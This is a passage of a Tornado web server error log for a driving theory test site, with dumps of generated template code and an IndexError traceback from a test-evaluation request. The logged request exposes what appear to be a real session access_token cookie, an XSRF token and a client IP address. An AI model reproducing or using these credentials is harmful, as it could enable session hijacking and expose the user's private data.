 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059f7ab8e4c85480ff4f8c2&answers=%5B3%5D&cursor=0&_xsrf=b032c94960104451b21c1d9bfef33d34', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=b032c94960104451b21c1d9bfef33d34; access_token="QUFBRzZsTmNzNkdjQkFGb1pDU2hRVFN0bFh2cUlVVTI5TkdRSUlNMjhneVpCYUFaQk16VGxHNFJ6RzVEc0lORUZIMUVvUDIxbkdWbm50aG5xdk0waDQzZHNtMnl3amRpanhDd2oyUTdnZ1pEWkQ=|1348073072|5b066f29f0211c97ef09fb8bd1697201e430b83e"; __utma=188782963.1383997649.1347899066.1348070020.1348072429.7; __utmb=188782963.16.10.1348072429; __utmc=188782963; __utmz=188782963.1347899066.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 72.43ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
